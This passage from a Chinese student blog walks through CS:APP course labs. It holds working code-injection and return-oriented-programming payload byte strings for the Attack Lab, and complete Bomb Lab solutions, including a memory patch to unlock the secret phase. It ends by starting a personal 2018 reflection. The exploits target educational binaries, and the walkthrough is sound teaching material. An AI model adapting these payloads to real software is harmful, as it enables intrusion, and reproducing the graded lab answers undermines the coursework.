为了获取这个指令的机器级表示，我们可以用gcc将其编译成obj，再用objdump反编译，可以得到对应的机器码。然后，再将其写入txt文件中即可。这里，我的答案是： bf fa 97 b9 59 /* Set %rdi to cookie*/c3 60 60 60 60 /* transfer control to touch2 */60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6078 dc 61 55 00 00 00 00ec 17 40 00 00 00 00 00 %rsp+028并且函数返回之后，PC将指向0x5561dc78，在这里即为bf字节对应的地址。顺利执行完mov语句后，执行c3(ret指令)，PC将指向0x4017ec，这里即为函数touch2的入口地址。继续，使用类似上面的命令将攻击字符串导入，第二题顺利解决。 Part I： level 3 和上一题类似，本题需要传入的是一个char指针，即将cookie的那串数字看成字符串。注意，0x不包含在这个字符串当中。同样的，我们可以使用类似上一题的方法，将我们需要的代码和cookie字符串(这里应该查询ASCII码，找到自己的那个串中每个字符对应的数字为多少)注入其中。 值得注意的是，本题有一个陷阱，当执行touch3的时候，touch3内部执行了hexmatch函数，这里会覆盖掉栈中我们注入的一些数据。但注意到栈是往下生长的，我们只要把cookie字符串放在上面即可。以下为我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60b0 dc 61 55 00 00 00 00 // 覆盖掉原先的返回地址，指向下方我们注入的那个函数fa 18 40 00 00 00 00 0048 c7 c7 c0 dc 61 55 c3 // 这一行将cookie的首地址mov到%rdi上，并返回00 00 00 00 00 00 00 0035 39 62 39 39 37 66 61 // 这一行为我的cookie值 Part II： level 2 这一道题开始，难度有点加大了。在rtarget文件中，采用了地址空间布局随机化，以及限制栈上的代码无法被执行等方式，使得我们无法采用代码注入对程序进行攻击。这个时候我们需要采用return-oriented programming（ROP）技术来攻击代码。具体如下图。123void setval_210(unsigned \*p) &#123; \*p = 3347663060U;&#125; 对于上面这个函数，我们看起来好像没有什么特别的。但倘若从机器码的角度来看呢？ 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4, (%rdi)400f1b: c3 retq 好像还是没有什么特别的。但我们注意到，48，89，c7还可以被理解成另一种意思。如果这个函数是从400f18地址开始的，那么将变成： 400f18: 48 89 c7 movq %rax, %rdi400f1b: c3 retq 整个程序的意思完全变了！这就是ROP的特点。利用别人自身的代码攻击别人。只要换了一个位置开始解读，整个程序的结果就会发生很大的变化。我们要做的正是利用这一点来攻击rtarget。为了方便我们的攻击，rtarget中含有很多类似上面这样的容易攻击的函数。从start_farm开始，到end_farm都是我们可以利用来攻击的gadget。 这个时候我们再来看一下题目的要求。我们需要使用ROP进入touch2中，并且传入正确的cookie。进入touch2还容易，可cookie怎么找？直接找源代码中有没有读应的字节序列吗？这不太可能。注意到还有这个代码popq，对应的编码为0x58~0x5f。怎么用呢？我们实现将cookie注入栈上，然后跳转到某个指令。popq将这个cookie取下，并放在某个寄存器中。然后在将其移动到%rdi。最后再跳转到touch2完成任务。 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 60ab 19 40 00 00 00 00 00 // 跳转到0x4019ab，实现popq，将cookie取下fa 97 b9 59 00 00 00 00 // 我自己的cookiea2 19 40 00 00 00 00 00 // 跳转到0x4019a2，将cookie移动至%rdiec 17 40 00 00 00 00 00 // 跳转到0x4017ec，即touch2所在地址 Part II： level 3 这道题需要实现跳转到touch3中，并且传入char指针，指向我们的cookie字符串。明显有一定难度。官方资料中将我们可能需要用到的指令列出来。如下。 由官方所给的提示，我们知道答案应该主要是用mov指令来实现的。注意到mov指令均含有89这个数字，我们可以使用ctrl+f查找有可能被我们用到的gadget。再次，我找到的如下。左边为该实现该指令需要跳转向的地址。123456789101112131415161718192021222324254019ab 58 pop %rax 90 nop c3 ret4019a2 48 89 c7 mov %rax, %rdi c3 ret4019dd 89 c2 mov %eax, %edx 90 nop c3 ret401a06 48 89 e0 mov %rsp, %rax c3 ret401a69 89 d1 mov %edx, %ecx 08 db orb %bl, %bl c3 ret401a42 89 c2 mov %eax, %edx 84 c0 testb %al, %al c3 ret401a27 89 ce mov %ecx,%esi 38 c0 cmpb %al, %al c3 ret 我们如果直接将字符串放在栈当中，但我们又不知到位置，没办法得到对应的指针。因此我们想采用栈顶指针+偏移量的做法。一开始，笔者在这里卡了非常久，一直找不到比较好的办法来解决。直到我看见了farm中有这样一个函数：123long add_xy(long x, long y) &#123; return x+y;&#125; 所以答案，瞬间解决了。按顺序，总共8个gadget，每一个gadget对应的汇编代码如下(ret省去)：12345678mov %rsp, %raxmov %rax, %rdipop %raxmov %eax, %edxmov %edx, %ecxmov %ecx, %esileaq (%rdi, %rsi, 1) %raxmov %rax %rdi 以下是我的答案： 60 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6060 60 60 60 6006 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00ab 19 40 00 00 00 00 0048 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0027 1a 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100 总结 转眼间寒假已经过了好几天了。今天花了接近一天的时间完成了这个实验，以及写下这篇博客。总的来说，虽然做实验的过程很辛苦，但是做完感觉还是很舒服的。虽然我也不知到为什么想要把所有实验的过程都用博客记录下来(这么偏僻的地方应该也没有人会过来看吧)。可能是为了锻炼自己写报告的能力？？？好吧，我也不知道。还是希望自己好好加油，继续坚持写下去吧。这也才仅仅是第三篇而已，还有8篇呢。。 頑張ってくださいね～！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Bomblab]]></title>
    <url>%2F2019%2F01%2F12%2Fcsapp-Bomblab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第二篇文章。具体的题目请见官网。另，本文均为自己手打，可能会有不少错误。如若发现有错误或者哪里写得不清楚，欢迎联系我修改(右下角小图标点开即可对话)。 这个lab从头到尾都是自己慢慢看过来的，花了很长的时间，也不知道算不算值得吧。个人见解：看反汇编代码是真的很花时间，对着几十行的代码有的时候看了几个小时还是懵的。这个时候还是换一下心情，做点别的事，可能突然就看懂了。但也不要看到代码多就直接放弃了吧，沉下心来看，还是可以看得懂的。 bomb lab实验要求 如同字面上的意思，这个实验要求我们拆一个“炸弹”。总共有六个关卡，需要保证每一个题目的输出结果都能满足某个特定的要求（答案不一定唯一），否则炸弹爆炸，游戏失败。 实验文件：bomb: 炸弹，打开后需要正确输入对应的字符串才能通关bomb.c: bomb的main函数所在的文件，提供给我们进行查看 实验目的：考察gdb的使用，以及reverse engneering的能力。需要学会使用gdb参考网站 さあ、私たちの実験を始めましょう。 首先，我们需要先使用objdump -d bomb &gt; bomb.txt这个命令，将bomb反编译，并保存在txt文件当中，方便我们查看。然后，不妨来看一下bomb.c的代码，方便我们对整个实验有一个整体的了解。 注意看一下注释，上面告诉了我们，可以将已解决的答案放入另一个txt文件当中，运行时用run &lt; answer.txt将其导入，可以不用重复打。然后我们看一下整体，总共有六个字符串，每一个字符串输入后，会判断是否正确，错误则发生爆炸，正确则继续输入。看完之后，就准备进入反编译得到的文件了。 bomb.txt 我们先整体看一下这个文件里面有什么。文件很长，总共有一千多行，不可能每一行都去解读。我们可以利用一些小技巧帮助我们理解。如main函数，我们可以看到它分成如下的几个部分。12345678910111213141516171819202122// 读取第一个字符串 400e32: e8 67 06 00 00 callq 40149e &lt;read_line&gt; 400e37: 48 89 c7 mov %rax,%rdi 400e3a: e8 a1 00 00 00 callq 400ee0 &lt;phase_1&gt; 400e3f: e8 80 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e44: bf a8 23 40 00 mov $0x4023a8,%edi 400e49: e8 c2 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第二个 400e4e: e8 4b 06 00 00 callq 40149e &lt;read_line&gt; 400e53: 48 89 c7 mov %rax,%rdi 400e56: e8 a1 00 00 00 callq 400efc &lt;phase_2&gt; 400e5b: e8 64 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e60: bf ed 22 40 00 mov $0x4022ed,%edi 400e65: e8 a6 fc ff ff callq 400b10 &lt;puts@plt&gt;// 第三个 400e6a: e8 2f 06 00 00 callq 40149e &lt;read_line&gt; 400e6f: 48 89 c7 mov %rax,%rdi 400e72: e8 cc 00 00 00 callq 400f43 &lt;phase_3&gt; 400e77: e8 48 07 00 00 callq 4015c4 &lt;phase_defused&gt; 400e7c: bf 0b 23 40 00 mov $0x40230b,%edi 400e81: e8 8a fc ff ff callq 400b10 &lt;puts@plt&gt; ... 结合bomb.c，我们应该可以很容易理解main.c的反汇编代码了。接下来，我们再看下其他函数。 1.strings_not_equal函数。名字很明显告诉了我们，这个函数是判断两个字符串是否相等的。相等则返回0 2.explode_bomb函数，注意到，其中使用了exit函数。也就是说，这个函数一旦运行，就意味着游戏失败，直接exit退出。12345678000000000040143a &lt;explode_bomb&gt;: 40143a: 48 83 ec 08 sub $0x8,%rsp 40143e: bf a3 25 40 00 mov $0x4025a3,%edi 401443: e8 c8 f6 ff ff callq 400b10 &lt;puts@plt&gt; 401448: bf ac 25 40 00 mov $0x4025ac,%edi 40144d: e8 be f6 ff ff callq 400b10 &lt;puts@plt&gt; 401452: bf 08 00 00 00 mov $0x8,%edi 401457: e8 c4 f7 ff ff callq 400c20 &lt;exit@plt&gt; 3.read_line函数。由名字我们也可以知道，这个函数就是为了读取一行字符串。 4.read_six_numbers函数。由名字，我们知道，这个函数就是用来读六个数字。注意代码中用到了sscanf函数，用于从某一个字符串中格式化读取。其中%rdi存放的是待读取字符串，%rsi存储的是用于格式化的串，后面跟着的都是变量的地址。如sscanf(“7 0”, “%d %d”, &amp;a, &amp;b)，返回值为成功读取的变量个数。 5.phase_1 phase_2 … 用于判断输入的字符串是否满足要求 phase_11234567890000000000400ee0 &lt;phase_1&gt;: 400ee0: 48 83 ec 08 sub $0x8,%rsp 400ee4: be 00 24 40 00 mov $0x402400,%esi 400ee9: e8 4a 04 00 00 callq 401338 &lt;strings_not_equal&gt; // 直接判断与0x402400位置的字符串是否相同 400eee: 85 c0 test %eax,%eax 400ef0: 74 05 je 400ef7 &lt;phase_1+0x17&gt; 400ef2: e8 43 05 00 00 callq 40143a &lt;explode_bomb&gt; 400ef7: 48 83 c4 08 add $0x8,%rsp 400efb: c3 retq 题目很短，难度也很小，就是将读取的字符串直接与首地址为0x402400的字符串作比较，若相同则返回，否则引爆炸弹。因此，我们需要知道0x402400中究竟放着什么字符串。直接从反汇编代码中没办法看出来，这个时候就要用到强大的gdb了。需要用到x命令。语法为: x/&lt;n/f/u&gt; 其中，n是一个正整数，表示需要显示的内存单元的个数。每个内存单元的大小与u相关。u表示每个单元的大小。f表示输出的格式。较常用的如下。 x 按十六进制格式输出 d 按十进制格式输出 t 按二进制格式输出 c 按字符格式输出 如：x/10c 0x402400 将以字符形式输出从0x402400开始的十个字节 x/10xw 0x402400 将以字符形式输出从0x402400开始的十个单元，每个单元为4个字节 具体的使用自己试一试就知道了。我们直接查看内存后就发现，对应的字符串为： Border relations with Canada have never been better. 第一题结束。 phase_2 第二题，长度明显加长了一些。我们可以试着将其分段解读。至于从哪里开始分的话，尽量是选择jmp类的命令所在的行或者jmp命令跳转到的行，这种地方有可能是for循环，或者条件分支语句的结尾。就第二题来说，我们可以将其分成两个部分。第一个部分如下：123456400efe: 48 83 ec 28 sub $0x28,%rsp // 分配40kb的内存空间400f02: 48 89 e6 mov %rsp,%rsi400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; // 将空间传给函数，读取六个数字400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) // 判断第一个数字是否为1400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; // 为1，跳开；否则，引爆炸弹400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; 第二个部分如下：12345678400f17: 8b 43 fc mov -0x4(%rbx),%eax400f1a: 01 c0 add %eax,%eax // 取出下一个数字，并*2400f1c: 39 03 cmp %eax,(%rbx) // 判断每一个数字是否为上一个数字的两倍400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; // 是，跳开；不是，爆炸400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; // 循环体内部，依次判断输入是否正确400f25: 48 83 c3 04 add $0x4,%rbx400f29: 48 39 eb cmp %rbp,%rbx400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 于是我们发现，整个程序对我们的要求有三个： 1.输入六个数字 2.第一个数字是1 3.第二个数字开始，每一个数字是前一个的两倍 由此，我们可以得到结果为：1， 2， 4， 8， 16， 32 phase_3 第三题，题目又变长了一些。在400f65之前，就是用sscanf读入两个数字。也就是说这次我们需要输入两个满足特定关系的数字。 再接下来的三行，程序判断输入的第一个数字是否大于小于等于7，否则爆炸。 接下来一行是重点了。1400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) 这个代码是什么意思呢？注意号的作用,该指令跳转的目标点是地址为0x402470+8%rax的内存单元。因此，我们需要打印出来0x402470+8i的值，对照代码后会发现，其实源代码应该就是一个switch函数。再看下接下来的几行代码，基本都是这样的格式：12400f7c: b8 cf 00 00 00 mov $0xcf,%eax400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 也就是说，根据你所输入的第一个数，你的第二个数需要对应这跳转目标点mov赋的值。为了简单起见，笔者直接打印0x402470，得到答案。12345678// b为我们输入的第一个数字，v为我们输入的第二个数字。int a;switch(b) &#123; case 0: a = ... case 1: a = ... case 2: a = ...&#125;if (a != v) explode_bomb(); phase_4 这道题看起来难度并不大。前面我们已经做了三道题了，基本上开始能够看懂一些复杂一点点的代码。phase_3函数应该也就不成问题了。首先输入两个数字，第二个数字必须为0，第一个数字将放入func4函数当中。也就是说，我们目的就是看懂func4这个函数在干什么。然后根据函数推断出我们需要输入的第一个数字即可。1234400fd6: 89 c1 mov %eax,%ecx400fd8: c1 e9 1f shr $0x1f,%ecx400fdb: 01 c8 add %ecx,%eax400fdd: d1 f8 sar %eax 首先，上面这个部分一开始让我迷惑了很久，这是要干嘛？？其中shr向右移动31位只有两个结果，当%ecx的值大于等于0时，得到结果为0，否则得到-1。因此这几行其实是当%eax的值小于0的时候就减去1。最后再向又移一位（缺省则位移一位）。 再接下来这段笔者看了特别久，最后是采用尝试着打出源代码才理解的。如果有跟我一样的看不太懂的，也不妨试试这个办法。12345678910111213141516400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx 400fe2: 39 f9 cmp %edi,%ecx 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 如上，将其通过跳转指令划分为4个部分。然后我们发现它调用了自己，也就是说这是一个递归函数。注意到phase_4调用它之前放入了3个参数。我们可以尝试着打出源代码。1234567891011// a为我们输入的数，b初始为0，c初始值为15。我们需要返回的值是0。因此，只需要让一开始tt就等于a即可void func4(int a, int b, int c)&#123; int t = c-b; if(t&lt;0) t--; t&gt;&gt;=1; int tt=t+b; if(tt&gt;a) c=tt-1; return 2*func4(a,b,c); else if (tt==a) return 0; else return 2*func4(a,tt+1,c)+1;&#125; phase_5 这道题长度又一次增加了，不过好在难度还不算太大。其实能做完第四题的话做第五题问题应该是不大的。和之前一样。我们先尝试着将整个代码拆分成几个部分。 首先，要求我们输入的应该是一个字符串，且长度必须为6。接下来的几行是一个循环，我们先跳过。先看最后面的几行代码。12344010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp)4010b3: be 5e 24 40 00 mov $0x40245e,%esi4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 上面几行将栈上面位于%rsp+10～%rsp+15的字符串与首地址为0x40245e的字符串相比较，打印地址后我们看到，字符串为flyers，也就是说我们的输入经过变换之后要变成flyers这个字符串。这个时候我们再回去看一下循环体内部是怎样做变换的。12345678940108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx40108f: 88 0c 24 mov %cl,(%rsp)401092: 48 8b 14 24 mov (%rsp),%rdx401096: 83 e2 0f and $0xf,%edx401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1)4010a4: 48 83 c0 01 add $0x1,%rax4010a8: 48 83 f8 06 cmp $0x6,%rax4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 注意到这一段代码，一次取出每一个字符。并将其与0xf相与，也就是说我们取出后四位的值c，再加上0x4024b0得到一个值v，再取出内存地址为v的值，放入栈当中。这样说可能有点难理解。我们来举一个例子。比如第一个字符串处理之后要变成’f’，查询ASCII得，相当与102，也就是0x66, 再查看一下内存，看到‘f’位于0x4024b9。因此我们需要的c的值为9，为了方便，我第一个字符输入的是i(0x69),和0xf相与之后恰好为9，满足要求。后面的同理，不再赘述。由此，本题成功解决了。 phase_6 这道题可以说是有点丧心病狂了。难度和之前感觉完全不在一个档次上。不过毕竟是压轴题，也可以理解。同样的，我们先将代码拆分成几个小部分。 首先，题目读取了六个数字。然后需要对这六个数字做出相当长的处理。下面的这一段应该是目前为止最难理解的一个点。如果无法理解，还请多看几遍。12345678910111213141516171819202122232425// 下面为一个嵌套循环，终止条件为r12 == 6 目的为检测是否所有字符均不相等以及小于等于6// %eax = a[i] (%r13)// %rbp = &amp;a[i]401114: 4c 89 ed mov %r13,%rbp401117: 41 8b 45 00 mov (%r13),%eax40111b: 83 e8 01 sub $0x1,%eax40111e: 83 f8 05 cmp $0x5,%eax401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; // a[i] &gt; 6 爆炸401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt;401128: 41 83 c4 01 add $0x1,%r12d40112c: 41 83 fc 06 cmp $0x6,%r12d401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; // %r12 == 6 退出循环// 第二层循环401132: 44 89 e3 mov %r12d,%ebx401135: 48 63 c3 movslq %ebx,%rax401138: 8b 04 84 mov (%rsp,%rax,4),%eax40113b: 39 45 00 cmp %eax,0x0(%rbp)40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; // a[i] != a[i+j] 否则爆炸401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt;401145: 83 c3 01 add $0x1,%ebx401148: 83 fb 05 cmp $0x5,%ebx40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt;// 第二层循环外40114d: 49 83 c5 04 add $0x4,%r13401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; 接下来的部分就比较好理解了。最终对整个程序的影响是将每一个值a[i]转化为7-a[i]。123456789401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax) // a[i] = 7 - a[i]401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; 再接下来这一段就比较麻烦了。和之前一样，我采用了尝试这打出源代码的方法进行理解。由于接下来的两段代码经常要访问内存，为了方便理解，我将内存代码打出来，欢迎查阅。 address address + 4 address + 8 address + 12 0x6032d0 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 0x000002b3 0x00000004 0x00603300 0x00000000 0x603310 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 0x000001bb 0x00000006 0x00000000 0x00000000 12345678910111213141516401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; 123456789101112 // %rsi : 4 * i // %eax : 用于和a[i]做比较 // %ecx : a[i]for (int i = 0; i &lt; 6; i++)&#123; if (a[i]&lt;=1) &#123; M[%rsp + 8 * i + 32] = 0x6032d0; &#125; else &#123; // 经查看内存可得 M[%rsp + 8 * i + 32] = 0x6032d0 + 16 * (a[i]-1); &#125;&#125; 关于上面的这段函数，我们可以理解为它在构造一个结构体Node(注意，指针为64位，且为小端)，其中Node的成员如下：12345Node &#123; int value; int id; Node* next;&#125; 倘若我们这样看，会发现整个代码容易理解了很多，结合具体内存中的值，我们发现，下面的这一段其实就是将各个结构体元素连接起来，形成一个链表。1234567891011124011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 最后这一段其实就好理解很多了。其实就是从前往后遍历链表，然后检查下一个结构体元素的value是否大于上一个的，否则爆炸。再看一下前面的内存值。我们就可以得到满足每一个元素value均大于上一个的链表的顺序了：2，1，6，5，4，3。当然要是你信心满满直接把这个顺序输入进去的话（像我一样），你会发现，炸弹还是爆炸了。别忘了，前面有一个操作将a[i]变成了7-a[i]，因此，我们应该再处理一下，得到最终的正确答案为：5，6，1，2，3，4 Congratulations! You’ve defused the bomb.1234567894011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt; secret_phase 然而，真的通关了吗？ 细心的同学可能会发现（我也发现啦！），在bomb.c中有着这样一段注释： /Wow, they got it! But isn’t something… missing? Perhaps something they overlooked? Mua ha ha ha ha! 从这句话，我们可以猜出，作者果然还是有阴谋的。于是我们再重新回去看了一下，发现了一个神奇的函数，叫secret_phase，果然有问题。crtf+f查找，发现这是在phase_defused中调用的，而且再看一下它调用的相关代码：12344015d1: 48 89 44 24 68 mov %rax,0x68(%rsp)4015d6: 31 c0 xor %eax,%eax4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 &lt;num_input_strings&gt;4015df: 75 5e jne 40163f &lt;phase_defused+0x7b&gt; 我们发现，只有当前6个炸弹全部拆除后才可以调用。这不明摆着是彩蛋了吗。接下来一大坨代码就是看你能不能顺利揭开彩蛋了。 接下来，再看下这坨代码：12345678910111213144015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r84015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx4015f0: be 19 26 40 00 mov $0x402619,%esi4015f5: bf 70 38 60 00 mov $0x603870,%edi4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; // 读取两个整数和一个字符串4015ff: 83 f8 03 cmp $0x3,%eax401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; // 没有读取到三个，原地爆炸401604: be 22 26 40 00 mov $0x402622,%esi401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; // 将读取的字符串与0x402622为首地址的字符串作比较401613: 85 c0 test %eax,%eax401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; // 字符串和给定的不相同，还是爆炸 恩，好吧，从一个给定的串中读取一些东西，打印0x402619后面的几个字符，我们发现结果是“%d %d %s”，读取两个整数和一个字符串。可事情并没有这么简单。我们尝试打印一下0x603870，发现字符串就只有“7 0”，不可能读3个数字。那我们怎么玩？？ 看来我们只好作弊了。使用gdb直接用print指令更改内存的值，将“7 0”后面补一点东西，补什么呢？那当然是0x402622上面的东西了。打印一下，发现是“DrEvil”，好吧满满的恶意。补上之后（可以用类似 p {int}0x603873=’D’ 这样的指令为内存单元赋值），就顺利进入了secret_phase函数了。 再看一下这个函数干了些什么。恩，读取了一个字符串，再用strtol函数将其转化为数字，也就是说，我们目的就是输入一个满足要求的数字。然后，又与2进行比较，也就是说，我们目的是要运行fun7函数，并且得到答案为2的返回值。 接下来我们看一下fun7函数。主体大概是这样子的。可以看出，这是一个递归。其中的v为我们输入的那个值。1234567if (x &lt;= v) &#123; return 2 * fun7(...);&#125;else if (x == v) return 0;else &#123; return 2 * fun7(...)+1;&#125; 好了，我们发现代码中有0x8(%rdi),%rdi这样的指令，接下来又要打印内存信息了。注意到一开始传入的值为0x6030f0,故我们打印一下0x6030f8和0x603100的值，发现答案为0x603110和0x603130,又是两个地址。并且，打印0x6030f0,0x603100,0x603110我们发现，结果都是一个比较小的值，不难猜测，这应该是一个二叉树。于是，按照这个规律，我们可以将整棵树打印出来.（其中各个框内表示的是该点的地址） 0x6030f00x6031100x6031300x6031900x6031500x6031700x6031b00x6031f00x6032500x6032700x6032300x6031d00x6032900x6032100x6032b0 接着，再倒推，2 = 2 * 1, 1 = 2 * 0 + 1 . 则应该选择地址为0x603150的点，打印得到，答案为22，结束。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[summary-2018]]></title>
    <url>%2F2019%2F01%2F01%2Fsummary-2018%2F</url>
    <content type="text"><![CDATA[2018年的一个小总结： 首先，其实不知道应该说什么比较好，整个2018年的话，应该还是算过得去吧。不知道该写什么，就还是按照时间的顺序写一下一些对我影响比较大的事情吧。 年初 记得2018年刚开始的时候，感慨还是挺深的，毕竟处在高三的中期，各个科目也基本都开始了总复习，心情还是略有些紧张的。尽管对很多事情都不确定，但还是硬着头皮往前走，当时基本上就一个目标，把高考考好。那段时间也算是挺努力的了，寒假也没玩什么游戏，基本上花了挺多时间来学习。 四五月份 这段时间就算是出生以来最难熬的一段时期了。天气十分的炎热，坐在教室里也几乎静不下心来学习。整个人的状态很乱。每天基本上就是刷题，除了题目还是题目，整个人真的十分的疲惫，但也没有任何办法，只能继续坚持下去。也许，那段时间也算是大学之前一段十分快乐的时光吧， 毕竟全班的同学一起向着同一个目标努力，这种机会以后基本上也都不会再有了。 六月七号 八号 每一年的这两天我想对全国的几百万考生来说都是及其难忘的。即便现在已经过了半年，那个时候自己的状态，心情，甚至在什么时间干了什么事，至今都记忆犹新。还有印象六月七号的那个晚上，下课时分，和另一个同学一起，在教室里谈论着未来。将来会发生什么事呢？考试要是砸了会怎么样呢？恩，基本上整个人都在那样的状态下，坐立不安。 到了六月八号下午，也许那是在那段时间心态最平和的时候了，什么也没说，什么也没想。考完恍若隔世，也是吧，毕竟十几年的读书最终换来的，最主要的也便是那一张写着成绩的白纸罢了。和父母一起，走在学校的街道上，心情说不上好，说不上坏。考完了，理论上来说应该是要比较开心的，可是在这种场合下却也怎么都开心不起来。是的，一个强烈的直觉告诉我：这次考试考得并不好，或者说很差。 接下来的一段时间里，基本上还是尽量让自己不要再去回忆考试的事情了。考得好坏都已经注定，再去想确实也没有任何意义。那段时间和母亲一起去珠海找我哥，又去普宁了一个同学家玩，接下来就是毕业典礼，然后就是揭晓成绩的时刻。 成绩揭晓 